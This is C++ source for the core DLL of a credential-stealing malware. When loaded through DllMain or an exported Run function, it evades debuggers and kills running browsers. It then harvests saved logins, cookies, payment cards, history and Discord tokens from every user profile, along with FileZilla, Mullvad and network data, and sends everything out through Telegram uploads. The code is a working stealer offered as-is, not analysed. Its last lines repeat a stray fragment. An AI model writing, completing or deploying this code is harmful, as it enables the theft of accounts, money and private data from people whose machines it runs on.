

#include "pch.hpp"
#include "config.hpp"
#include "result.hpp"
#include "http.hpp"
#include "telegram.hpp"

#if ENABLE_BROWSERSNATCH

BOOL chromium_parser(std::string username, std::string stealer_db);
BOOL chromium_cookie_collector(std::string username, std::string stealer_db);
BOOL chromium_bookmarks_collector(std::string username, std::string stealer_db);
BOOL chromium_history_collector(std::string username, std::string stealer_db);
BOOL gecko_parser(std::string username, std::string stealer_db);
BOOL gecko_cookie_collector(std::string username, std::string stealer_db);
BOOL gecko_bookmarks_collector(std::string username, std::string stealer_db);
BOOL gecko_history_collector(std::string username, std::string stealer_db);
BOOL app_bound_browsers_cookie_collector(std::string username, std::string stealer_db, BOOL service, std::string service_parameter);
#endif


#include "stealers/chromium.hpp"

#if ENABLE_FILEZILLA
#include "stealers/filezilla.hpp"
#endif

#if ENABLE_DISCORD
#include "stealers/discord.hpp"
#endif

#if ENABLE_MULLVAD
#include "stealers/mullvad.hpp"
#endif

#if ENABLE_NETWORK
#include "stealers/network.hpp"
#endif

#if ANTIDBG
#include "debugging.hpp"
#endif


static void kill_browsers() {
    const char* targets[] = {
        "chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "operagx.exe",
        "vivaldi.exe", "firefox.exe", "thunderbird.exe", "chromium.exe",
        "yandex.exe", "seamonkey.exe"
    };
    for (auto t : targets) {
        hidden_system(va("taskkill /f /im %s >nul 2>&1", t).c_str());
    }
    Sleep(800);
}


static std::string machine_tag() {
    char comp[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD sz = sizeof(comp);
    GetComputerNameA(comp, &sz);
    return "[" + std::string(comp) + "\\" + get_username() + "]";
}

static void run_all() {
#if ANTIDBG
    if (is_debugged()) return;
#endif

    kill_browsers();

    std::string tag = machine_tag();

#if ENABLE_BROWSERSNATCH

    std::string username = get_username();
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    std::string stealer_db = std::string(tmp) + "d" + std::to_string(GetTickCount64() & 0xFFFFFF) + ".db";

    try { chromium_parser(username, stealer_db); } catch (...) {}
    try { chromium_cookie_collector(username, stealer_db); } catch (...) {}
    try { chromium_bookmarks_collector(username, stealer_db); } catch (...) {}
    try { chromium_history_collector(username, stealer_db); } catch (...) {}
    try { gecko_parser(username, stealer_db); } catch (...) {}
    try { gecko_cookie_collector(username, stealer_db); } catch (...) {}
    try { gecko_bookmarks_collector(username, stealer_db); } catch (...) {}
    try { gecko_history_collector(username, stealer_db); } catch (...) {}

    try { app_bound_browsers_cookie_collector(username, stealer_db, false, ""); } catch (...) {}


    try {
        for (const auto& entry : std::filesystem::directory_iterator("C:\\users")) {
            if (!entry.is_directory()) continue;
            std::string other_user = entry.path().filename().string();
            if (other_user == username || other_user == "Public" ||
                other_user == "Default" || other_user == "Default User" ||
                other_user == "All Users") continue;
            try { chromium_parser(other_user, stealer_db); } catch (...) {}
            try { chromium_cookie_collector(other_user, stealer_db); } catch (...) {}
            try { chromium_bookmarks_collector(other_user, stealer_db); } catch (...) {}
            try { chromium_history_collector(other_user, stealer_db); } catch (...) {}
            try { gecko_parser(other_user, stealer_db); } catch (...) {}
            try { gecko_cookie_collector(other_user, stealer_db); } catch (...) {}
            try { gecko_bookmarks_collector(other_user, stealer_db); } catch (...) {}
            try { gecko_history_collector(other_user, stealer_db); } catch (...) {}
        }
    } catch (...) {}


    if (std::filesystem::exists(stealer_db) && std::filesystem::file_size(stealer_db) > 0) {
        telegram::upload_file(s2ws(stealer_db));
        try { std::filesystem::remove(stealer_db); } catch (...) {}
    }
#endif


    {
        struct { const char* exe; const char* env; const char* sub; } cc_browsers[] = {
            {"chrome.exe",    "LOCALAPPDATA", "Google\\Chrome\\User Data"},
            {"msedge.exe",    "LOCALAPPDATA", "Microsoft\\Edge\\User Data"},
            {"brave.exe",     "LOCALAPPDATA", "BraveSoftware\\Brave-Browser\\User Data"},
            {"opera.exe",     "APPDATA",      "Opera Software\\Opera Stable"},
            {"vivaldi.exe",   "LOCALAPPDATA", "Vivaldi\\User Data"},
            {"yandex.exe",    "LOCALAPPDATA", "Yandex\\YandexBrowser\\User Data"},
        };
        for (auto& b : cc_browsers) {
            char* env_val = nullptr; size_t len;
            _dupenv_s(&env_val, &len, b.env);
            if (!env_val) continue;
            auto path = std::filesystem::path(std::string(env_val) + "\\" + b.sub);
            free(env_val);
            if (!std::filesystem::exists(path)) continue;
            try {
                ChromiumStealer s(b.exe, path, false);
                s.steal();
            } catch (...) {}
        }
    }

#if ENABLE_FILEZILLA
    try { FileZillaStealer().steal(); } catch (...) {}
#endif

#if ENABLE_DISCORD
    try { DiscordStealer().steal(); } catch (...) {}
#endif

#if ENABLE_MULLVAD
    try { MullvadStealer().steal(); } catch (...) {}
#endif

#if ENABLE_NETWORK
    try { NetworkStealer().steal(); } catch (...) {}
#endif


    std::string report = dump_results();
    if (!report.empty()) {

        std::vector<char> report_data(report.begin(), report.end());
        telegram::upload_data(report_data, "report.txt");
    }


    std::string summary = tag + " extraction done\n"
        "Logins: " + std::to_string(logins.size()) + "\n"
        "Cookies: " + std::to_string(cookies.size()) + "\n"
        "Cards: " + std::to_string(cards.size()) + "\n"
        "Discord: " + std::to_string(discord_tokens.size());

    {
        std::lock_guard<std::mutex> lock(extra_info_mutex);
        std::string extra = extra_info.str();
        if (!extra.empty()) summary += "\n---\n" + extra;
    }

    telegram::send_message(summary);
}

static std::atomic<bool> s_executed{false};

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);


        CreateThread(nullptr, 0, [](LPVOID) -> DWORD {
            Sleep(2000);
            if (!s_executed.exchange(true))
                run_all();
            return 0;
        }, nullptr, 0, nullptr);
    }
    return TRUE;
}


extern "C" __declspec(dllexport) void Run(HWND hwnd, HINSTANCE hinst,
                                           LPSTR lpszCmdLine, int nCmdShow) {
    if (!s_executed.exchange(true))
        run_all();
}
    run_all();
}
